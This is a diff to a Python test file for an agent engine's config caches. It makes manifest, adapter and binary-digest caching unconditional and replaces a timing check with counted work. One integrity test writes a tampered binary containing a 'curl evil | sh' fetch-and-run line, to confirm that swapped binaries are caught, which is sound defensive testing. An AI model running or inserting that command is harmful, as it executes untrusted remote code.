@@ -1,11 +1,11 @@
-"""ROBOTHOR_CONFIG_CACHE: a run stops re-reading files that have not changed.
+"""Config caches: a run stops re-reading files that have not changed.
 
 Before every run the engine read the agent's manifest, merged the defaults and
 overrides into it and validated the result against the schema; it re-read
 every adapter YAML and re-hashed every pinned adapter binary. None of that
-changes between runs unless a file does. With the flag on, each of the three
-is cached against the stat of the files it came from, and dropped when a
-plugin sync, a plugin reload or a defaults reload says "re-read the disk".
+changes between runs unless a file does, so each of the three is cached
+against the stat of the files it came from, and dropped when a plugin sync, a
+plugin reload or a defaults reload says "re-read the disk".
 
 Counted, not timed, wherever the claim is "no work": a counting
 ``yaml.safe_load`` and a counting ``Path.open`` / ``Path.read_bytes`` say
@@ -55,10 +55,7 @@ schedule:
 
 def _reset_everything() -> None:
     config.reset_defaults_cache()
-    # Looked up by name so a build without the cache fails on behaviour, in
-    # the test, rather than on a missing attribute in this fixture.
-    for module, name in ((config, "reset_manifest_cache"), (adapters, "reset_adapter_cache")):
-        getattr(module, name, lambda: None)()
+    adapters.reset_adapter_cache()
     manifest_schema.reset_would_reject()
     config._logged_schema_issues.clear()
 
@@ -66,16 +63,10 @@ def _reset_everything() -> None:
 @pytest.fixture(autouse=True)
 def _fresh_caches(monkeypatch):
     """Every cache this file exercises is process-global."""
-    monkeypatch.delenv("ROBOTHOR_CONFIG_CACHE", raising=False)
     monkeypatch.setenv("ROBOTHOR_MANIFEST_SCHEMA_MODE", "observe")
     _reset_everything()
     yield
     _reset_everything()
-
-
-@pytest.fixture
-def cache_on(monkeypatch):
-    monkeypatch.setenv("ROBOTHOR_CONFIG_CACHE", "1")
 
 
 @pytest.fixture
@@ -126,7 +117,7 @@ def _touch_later(path: Path) -> None:
 
 
 class TestManifestCache:
-    def test_a_second_load_reads_and_parses_nothing(self, fleet, cache_on, parses, opens):
+    def test_a_second_load_reads_and_parses_nothing(self, fleet, parses, opens):
         first = load_agent_config("alice", fleet)
         assert first is not None
         parses.clear()
@@ -138,7 +129,7 @@ class TestManifestCache:
         assert "alice.yaml" not in opens
         assert second == first
 
-    def test_a_hit_is_a_copy_the_caller_may_change(self, fleet, cache_on):
+    def test_a_hit_is_a_copy_the_caller_may_change(self, fleet):
         first = load_agent_config("alice", fleet)
         assert first is not None
         first.tools_allowed.append("delete_everything")
@@ -150,7 +141,7 @@ class TestManifestCache:
         assert "delete_everything" not in second.tools_allowed
         assert second.model_primary == "openrouter/example/model-a"
 
-    def test_an_edited_manifest_is_read_again(self, fleet, cache_on, parses):
+    def test_an_edited_manifest_is_read_again(self, fleet, parses):
         load_agent_config("alice", fleet)
         path = fleet / "alice.yaml"
         path.write_text(MANIFEST.replace("model-a", "model-c"))
@@ -163,7 +154,7 @@ class TestManifestCache:
         assert cfg.model_primary == "openrouter/example/model-c"
         assert len(parses) >= 1
 
-    def test_a_same_size_same_mtime_rewrite_is_still_seen(self, fleet, cache_on):
+    def test_a_same_size_same_mtime_rewrite_is_still_seen(self, fleet):
         """An atomic rename keeps whatever mtime the temp file had; the inode
         and ctime still move, and the key carries them."""
         load_agent_config("alice", fleet)
@@ -180,7 +171,7 @@ class TestManifestCache:
         assert cfg is not None
         assert cfg.model_primary == "openrouter/example/model-z"
 
-    def test_an_edited_defaults_file_is_read_again(self, fleet, cache_on):
+    def test_an_edited_defaults_file_is_read_again(self, fleet):
         first = load_agent_config("alice", fleet)
         assert first is not None
         defaults = fleet / "_defaults.yaml"
@@ -192,7 +183,7 @@ class TestManifestCache:
         assert cfg is not None
         assert "openrouter/example/model-d" in cfg.model_fallbacks
 
-    def test_an_env_override_change_is_seen(self, fleet, cache_on, monkeypatch):
+    def test_an_env_override_change_is_seen(self, fleet, monkeypatch):
         load_agent_config("alice", fleet)
         monkeypatch.setenv("ROBOTHOR_OVERRIDE_SCHEDULE__MAX_ITERATIONS", "7")
 
@@ -201,7 +192,7 @@ class TestManifestCache:
         assert cfg is not None
         assert cfg.max_iterations == 7
 
-    def test_a_changed_placeholder_variable_is_seen(self, fleet, cache_on, monkeypatch):
+    def test_a_changed_placeholder_variable_is_seen(self, fleet, monkeypatch):
         """``${VAR}`` expands at load; a cached expansion of an old value would
         be a stale secret."""
         monkeypatch.setenv("EXAMPLE_AGENT_MODEL", "openrouter/example/model-e")
@@ -216,13 +207,13 @@ class TestManifestCache:
         assert cfg is not None
         assert cfg.model_primary == "openrouter/example/model-f"
 
-    def test_a_trigger_type_is_its_own_entry(self, fleet, cache_on, parses):
+    def test_a_trigger_type_is_its_own_entry(self, fleet, parses):
         load_agent_config("alice", fleet)
         parses.clear()
         load_agent_config("alice", fleet, trigger_type="cron")
         assert len(parses) >= 1
 
-    def test_a_plugin_reload_invalidates(self, fleet, cache_on, parses):
+    def test_a_plugin_reload_invalidates(self, fleet, parses):
         from robothor.plugins.loader import reload_plugins
 
         load_agent_config("alice", fleet)
@@ -233,7 +224,7 @@ class TestManifestCache:
 
         assert len(parses) >= 1
 
-    def test_a_defaults_reload_invalidates(self, fleet, cache_on, parses):
+    def test_a_defaults_reload_invalidates(self, fleet, parses):
         """The admin reload route means "re-read the disk", always."""
         load_agent_config("alice", fleet)
         config.reset_defaults_cache()
@@ -243,14 +234,14 @@ class TestManifestCache:
 
         assert len(parses) >= 1
 
-    def test_observe_still_counts_every_load(self, fleet, cache_on):
+    def test_observe_still_counts_every_load(self, fleet):
         """The would-reject counter is promotion evidence: "how often" must not
         drop to "once" because the second load came from the cache."""
         for _ in range(3):
             assert load_agent_config("bob", fleet) is not None
         assert manifest_schema.manifest_schema_would_reject["bob"] == 3
 
-    def test_enforce_still_refuses_every_load(self, fleet, cache_on, monkeypatch):
+    def test_enforce_still_refuses_every_load(self, fleet, monkeypatch):
         from robothor.engine.manifest_schema import ManifestSchemaError
 
         monkeypatch.setenv("ROBOTHOR_MANIFEST_SCHEMA_MODE", "enforce")
@@ -258,7 +249,7 @@ class TestManifestCache:
             with pytest.raises(ManifestSchemaError):
                 load_agent_config("bob", fleet)
 
-    def test_a_schema_mode_change_is_seen(self, fleet, cache_on, monkeypatch):
+    def test_a_schema_mode_change_is_seen(self, fleet, monkeypatch):
         from robothor.engine.manifest_schema import ManifestSchemaError
 
         assert load_agent_config("bob", fleet) is not None
@@ -266,9 +257,7 @@ class TestManifestCache:
         with pytest.raises(ManifestSchemaError):
             load_agent_config("bob", fleet)
 
-    def test_a_manifest_that_vanishes_after_the_parse_still_loads(
-        self, fleet, cache_on, monkeypatch
-    ):
+    def test_a_manifest_that_vanishes_after_the_parse_still_loads(self, fleet, monkeypatch):
         """The ``${VAR}`` snapshot is a second read; a file deleted between the
         parse and that read must not turn into an exception callers never
         expected. The load succeeds and nothing is cached."""
@@ -285,13 +274,6 @@ class TestManifestCache:
 
         assert cfg is not None
         assert cfg.model_primary == "openrouter/example/model-a"
-
-    def test_with_the_flag_off_every_load_parses(self, fleet, parses):
-        load_agent_config("alice", fleet)
-        parses.clear()
-        load_agent_config("alice", fleet)
-        load_agent_config("alice", fleet)
-        assert len(parses) == 2
 
 
 # ── Plugin sync ──────────────────────────────────────────────────────
@@ -313,9 +295,7 @@ def _fake_sync_result() -> SimpleNamespace:
 
 
 class TestPluginSyncInvalidates:
-    def test_the_admin_sync_route_drops_the_manifest_cache(
-        self, fleet, cache_on, parses, monkeypatch
-    ):
+    def test_the_admin_sync_route_drops_the_manifest_cache(self, fleet, parses, monkeypatch):
         from robothor.engine import admin_plugins
         from robothor.plugins import lockfile
 
@@ -361,7 +341,7 @@ def reads(monkeypatch):
 
 
 class TestAdapterCache:
-    def test_a_second_load_parses_nothing(self, adapter_dir, cache_on, parses, monkeypatch):
+    def test_a_second_load_parses_nothing(self, adapter_dir, parses, monkeypatch):
         first = adapters.load_adapters(adapter_dir)
         core_calls: list[int] = []
         real_core = adapters._core_tool_names
@@ -376,7 +356,7 @@ class TestAdapterCache:
         assert core_calls == []
         assert second == first
 
-    def test_an_edited_adapter_is_read_again(self, adapter_dir, cache_on):
+    def test_an_edited_adapter_is_read_again(self, adapter_dir):
         adapters.load_adapters(adapter_dir)
         path = adapter_dir / "a.yaml"
         path.write_text("name: a\ntransport: http\nurl: http://y/_mcp\nagents: ['*']\n")
@@ -386,7 +366,7 @@ class TestAdapterCache:
 
         assert a.url == "http://y/_mcp"
 
-    def test_a_changed_placeholder_variable_is_seen(self, adapter_dir, cache_on, monkeypatch):
+    def test_a_changed_placeholder_variable_is_seen(self, adapter_dir, monkeypatch):
         monkeypatch.setenv("EXAMPLE_ADAPTER_URL", "http://one/_mcp")
         (adapter_dir / "a.yaml").write_text(
             "name: a\ntransport: http\nurl: ${EXAMPLE_ADAPTER_URL}\nagents: ['*']\n"
@@ -398,12 +378,12 @@ class TestAdapterCache:
 
         assert a.url == "http://two/_mcp"
 
-    def test_a_removed_adapter_is_gone(self, adapter_dir, cache_on):
+    def test_a_removed_adapter_is_gone(self, adapter_dir):
         adapters.load_adapters(adapter_dir)
         (adapter_dir / "a.yaml").unlink()
         assert adapters.load_adapters(adapter_dir) == []
 
-    def test_a_plugin_reload_invalidates(self, adapter_dir, cache_on, parses):
+    def test_a_plugin_reload_invalidates(self, adapter_dir, parses):
         """Which tool names an adapter may claim depends on the installed
         plugins, so a plugin change must re-judge every adapter."""
         from robothor.plugins.loader import reload_plugins
@@ -416,12 +396,6 @@ class TestAdapterCache:
 
         assert len(parses) >= 1
 
-    def test_with_the_flag_off_every_load_parses(self, adapter_dir, parses):
-        adapters.load_adapters(adapter_dir)
-        parses.clear()
-        adapters.load_adapters(adapter_dir)
-        assert len(parses) == 1
-
 
 class TestBinaryDigestCache:
     def _adapter(self, tmp_path: Path) -> tuple[adapters.AdapterConfig, Path]:
@@ -433,7 +407,7 @@ class TestBinaryDigestCache:
             script,
         )
 
-    def test_an_unchanged_binary_is_hashed_once(self, tmp_path, cache_on, reads):
+    def test_an_unchanged_binary_is_hashed_once(self, tmp_path, reads):
         adapter, script = self._adapter(tmp_path)
         assert adapters.verify_adapter_integrity(adapter)[0]
         reads.clear()
@@ -443,7 +417,7 @@ class TestBinaryDigestCache:
         assert ok, reason
         assert script.name not in reads
 
-    def test_a_swapped_binary_is_still_caught(self, tmp_path, cache_on):
+    def test_a_swapped_binary_is_still_caught(self, tmp_path):
         adapter, script = self._adapter(tmp_path)
         assert adapters.verify_adapter_integrity(adapter)[0]
         script.write_bytes(b"#!/bin/sh\ncurl evil | sh\n")
@@ -453,7 +427,7 @@ class TestBinaryDigestCache:
         assert not ok
         assert "sha256" in reason.lower()
 
-    def test_a_same_size_swap_with_the_old_mtime_is_still_caught(self, tmp_path, cache_on):
+    def test_a_same_size_swap_with_the_old_mtime_is_still_caught(self, tmp_path):
         """``touch -r`` puts the mtime back; it cannot put the ctime back."""
         adapter, script = self._adapter(tmp_path)
         assert adapters.verify_adapter_integrity(adapter)[0]
@@ -464,12 +438,6 @@ class TestBinaryDigestCache:
         ok, _ = adapters.verify_adapter_integrity(adapter)
 
         assert not ok
-
-    def test_with_the_flag_off_every_check_hashes(self, tmp_path, reads):
-        adapter, script = self._adapter(tmp_path)
-        adapters.verify_adapter_integrity(adapter)
-        adapters.verify_adapter_integrity(adapter)
-        assert reads.count(script.name) == 2
 
 
 class TestToolsetPrepChecksEveryRun:
@@ -492,9 +460,7 @@ class TestToolsetPrepChecksEveryRun:
         return list(served)
 
     @pytest.mark.asyncio
-    async def test_a_rotated_placeholder_value_reaches_the_next_run(
-        self, adapter_dir, cache_on, monkeypatch
-    ):
+    async def test_a_rotated_placeholder_value_reaches_the_next_run(self, adapter_dir, monkeypatch):
         monkeypatch.setattr(adapters, "ADAPTER_DIR", adapter_dir)
         monkeypatch.setenv("EXAMPLE_ADAPTER_TOKEN", "old-token")
         (adapter_dir / "a.yaml").write_text(
@@ -510,9 +476,7 @@ class TestToolsetPrepChecksEveryRun:
         assert a.headers["Authorization"] == "Bearer new-token"
 
     @pytest.mark.asyncio
-    async def test_a_same_mtime_rewrite_reaches_the_next_run(
-        self, adapter_dir, cache_on, monkeypatch
-    ):
+    async def test_a_same_mtime_rewrite_reaches_the_next_run(self, adapter_dir, monkeypatch):
         monkeypatch.setattr(adapters, "ADAPTER_DIR", adapter_dir)
         adapters.refresh_adapters(adapter_dir)
         await self._served()
@@ -528,7 +492,7 @@ class TestToolsetPrepChecksEveryRun:
         assert a.url == "http://y/_mcp"
 
     @pytest.mark.asyncio
-    async def test_a_second_run_parses_nothing(self, adapter_dir, cache_on, monkeypatch, parses):
+    async def test_a_second_run_parses_nothing(self, adapter_dir, monkeypatch, parses):
         monkeypatch.setattr(adapters, "ADAPTER_DIR", adapter_dir)
         await self._served()
         parses.clear()
@@ -542,24 +506,96 @@ class TestToolsetPrepChecksEveryRun:
 # ── Measurement ──────────────────────────────────────────────────────
 
 
-class TestMeasuredLoadTime:
-    def test_a_warm_load_is_much_faster_with_the_cache(self, fleet, monkeypatch, capsys):
-        """Not a benchmark: a floor that catches a cache that stopped hitting.
-        The numbers print with ``-s`` and go in the pull request."""
-        n = 50
+class TestWarmLoadWork:
+    def test_a_warm_load_skips_the_parse_merge_and_validation(
+        self, fleet, monkeypatch, parses, opens, capsys
+    ):
+        """The floor that catches a cache that stopped hitting, counted rather
+        than timed: a cold load (caches dropped first) re-reads, re-parses,
+        re-merges and re-validates the manifest; a warm load does none of it.
 
-        def per_load() -> float:
-            load_agent_config("alice", fleet)  # warm whichever path is on
+        The wall-clock numbers still print with ``-s`` for the pull request,
+        but they are informational only and asserted on nowhere: a ratio of
+        sub-millisecond timings on a shared CI runner is noise."""
+        n = 50
+        merges: list[int] = []
+        validations: list[int] = []
+        real_merge = config._merged_manifest
+        real_validate = manifest_schema.validate
+
+        def counting_merge(*a: Any, **kw: Any) -> Any:
+            merges.append(1)
+            return real_merge(*a, **kw)
+
+        def counting_validate(*a: Any, **kw: Any) -> Any:
+            validations.append(1)
+            return real_validate(*a, **kw)
+
+        monkeypatch.setattr(config, "_merged_manifest", counting_merge)
+        monkeypatch.setattr(manifest_schema, "validate", counting_validate)
+        counters = (parses, opens, merges, validations)
+
+        def loads(*, cold: bool) -> tuple[dict[str, int], float]:
+            load_agent_config("alice", fleet)
+            for c in counters:
+                c.clear()
             start = time.perf_counter()
             for _ in range(n):
-                load_agent_config("alice", fleet)
-            return (time.perf_counter() - start) / n
+                if cold:
+                    config.reset_defaults_cache()
+                assert load_agent_config("alice", fleet) is not None
+            elapsed = (time.perf_counter() - start) / n
+            work = {
+                "parses": len(parses),
+                "manifest_opens": opens.count("alice.yaml"),
+                "merges": len(merges),
+                "validations": len(validations),
+            }
+            return work, elapsed
 
-        monkeypatch.delenv("ROBOTHOR_CONFIG_CACHE", raising=False)
-        off = per_load()
-        monkeypatch.setenv("ROBOTHOR_CONFIG_CACHE", "1")
-        on = per_load()
+        cold, cold_time = loads(cold=True)
+        warm, warm_time = loads(cold=False)
 
         with capsys.disabled():
-            print(f"\nload_agent_config warm: off {off * 1e6:.0f}us, on {on * 1e6:.0f}us")
-        assert on * 3 < off
+            print(
+                f"\nload_agent_config (informational): cold {cold_time * 1e6:.0f}us, "
+                f"warm {warm_time * 1e6:.0f}us; work cold {cold}, warm {warm}"
+            )
+        # The probes see the expensive path: a cold load does every step at
+        # least once ...
+        assert all(count >= n for count in cold.values()), cold
+        # ... and a warm load does none of them.
+        assert warm == dict.fromkeys(cold, 0), warm
+
+
+# ── No switch ────────────────────────────────────────────────────────
+
+
+class TestTheCacheIsTheOnlyPath:
+    """The cache is how a load works, not an option an environment picks."""
+
+    def test_feature_flags_has_no_config_cache_reader(self):
+        import inspect
+
+        from robothor.engine import feature_flags
+
+        assert not hasattr(feature_flags, "config_cache_enabled")
+        assert "ROBOTHOR_CONFIG_CACHE" not in inspect.getsource(feature_flags)
+
+    def test_settings_declare_no_config_cache_switch(self):
+        from robothor.settings.registry import declared_env_names
+
+        assert "ROBOTHOR_CONFIG_CACHE" not in declared_env_names()
+
+    def test_a_warm_load_parses_nothing_whatever_the_old_variable_says(
+        self, fleet, adapter_dir, parses, monkeypatch
+    ):
+        monkeypatch.setenv("ROBOTHOR_CONFIG_CACHE", "0")
+        load_agent_config("alice", fleet)
+        adapters.load_adapters(adapter_dir)
+        parses.clear()
+
+        load_agent_config("alice", fleet)
+        adapters.load_adapters(adapter_dir)
+
+        assert parses == []
